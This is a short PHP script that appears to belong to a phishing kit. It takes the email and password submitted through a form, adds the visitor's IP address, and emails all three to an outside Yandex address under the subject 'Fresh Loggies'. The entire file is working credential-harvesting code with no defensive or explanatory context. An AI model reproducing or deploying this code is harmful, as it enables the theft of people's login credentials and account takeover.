<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
		$to = "pgvirus@yandex.com";
		
		
         $subject = "Fresh Loggies : ip";
		 
		 $message =  "Email ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: All domain LOgs \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}
?>


